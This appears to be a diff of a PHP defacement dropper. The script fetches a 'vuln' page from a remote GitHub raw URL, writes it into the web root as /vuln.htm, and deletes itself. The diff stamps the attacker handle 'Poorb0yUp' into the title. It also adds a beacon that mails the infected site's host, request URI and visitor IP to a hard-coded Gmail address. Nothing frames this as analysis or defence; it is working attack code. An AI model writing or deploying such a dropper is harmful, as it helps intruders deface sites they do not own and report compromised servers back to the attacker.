@@ -1,4 +1,4 @@
-<title>Vuln!! patch it Now!</title>
+<title>Vuln!! patch it Now!Poorb0yUp!!</title>
 <?php
 function http_get($url){
 	$im = curl_init($url);
@@ -21,7 +21,7 @@ if(file_exists($check)){
 echo "done .\n " ;
 
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
-$text2 = http_get('https://pastebin.com/raw/880ufaWF');
+$text2 = http_get('https://raw.githubusercontent.com/poorb0y/Test/master/vuln.txt');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
 fclose($open2);
@@ -32,4 +32,16 @@ if(file_exists($check2)){
 echo "done .\n " ;
 
 @unlink(__FILE__);
+?>
+<?php
+$ip = getenv("REMOTE_ADDR");
+$ra44 = rand(1, 99999);
+$subj98 = " Bot V3 Rzlt |$ip";
+$email = "massacar320@gmail.com";
+$from = "From: Result<botv3@poorb0ybotv3.com";
+$a45 = $_SERVER['REQUEST_URI'];
+$b75 = $_SERVER['HTTP_HOST'];
+$m22 = $ip . "";
+$msg8873 = "$a45 $b75 $m22";
+mail($email, $subj98, $msg8873, $from);
 ?>
